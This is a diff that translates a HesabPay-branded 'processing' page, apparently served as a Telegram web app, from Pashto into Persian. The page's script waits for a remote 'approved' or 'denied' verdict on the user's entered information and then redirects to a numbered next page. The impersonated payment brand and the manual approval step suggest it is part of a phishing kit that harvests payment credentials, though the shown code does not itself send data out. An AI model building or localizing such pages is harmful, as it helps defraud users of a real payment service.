@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="ps" dir="rtl">
+<html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Hesapay - پروسس کیږي</title>
+    <title>HesabPay - در حال پردازش</title>
 
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
@@ -73,8 +73,8 @@
 
 <div class="loading-card">
     <div class="loader-circle"></div>
-    <h2 id="main-text">پروسس کیږي...</h2>
-    <p id="sub-text">د تایید لپاره چمتووالی نیول کیږي...</p>
+    <h2 id="main-text">در حال پردازش...</h2>
+    <p id="sub-text">آماده‌سازی برای تأیید...</p>
 </div>
 
 <script>
@@ -109,8 +109,8 @@ document.addEventListener("DOMContentLoaded", async () => {
 
     // -------------------- TEXT CHANGE --------------------
     setTimeout(() => {
-        mainText.textContent = "مهرباني وکړئ لږ انتظار وکړئ...";
-        subText.textContent = "دا به یوازې څو ثانیې وخت ونیسي";
+        mainText.textContent = "لطفاً کمی منتظر بمانید...";
+        subText.textContent = "این کار فقط چند ثانیه طول خواهد کشید";
     }, 3000);
 
     // -------------------- CHECK APPROVAL --------------------
@@ -122,8 +122,8 @@ document.addEventListener("DOMContentLoaded", async () => {
             const data = await res.json();
 
             if (data.status === "approved") {
-                mainText.textContent = "منظور شو!";
-                subText.textContent = "بل مخ خلاصېږي...";
+                mainText.textContent = "تأیید شد!";
+                subText.textContent = "صفحه بعدی در حال باز شدن است...";
 
                 setTimeout(() => {
                     window.location.href = "/page8";
@@ -131,8 +131,8 @@ document.addEventListener("DOMContentLoaded", async () => {
             }
 
             if (data.status === "denied") {
-                mainText.textContent = "رد شو!";
-                subText.textContent = "ستاسو معلومات ناسم دي.";
+                mainText.textContent = "رد شد!";
+                subText.textContent = "اطلاعات وارد شده شما نادرست است.";
             }
 
         } catch (err) {
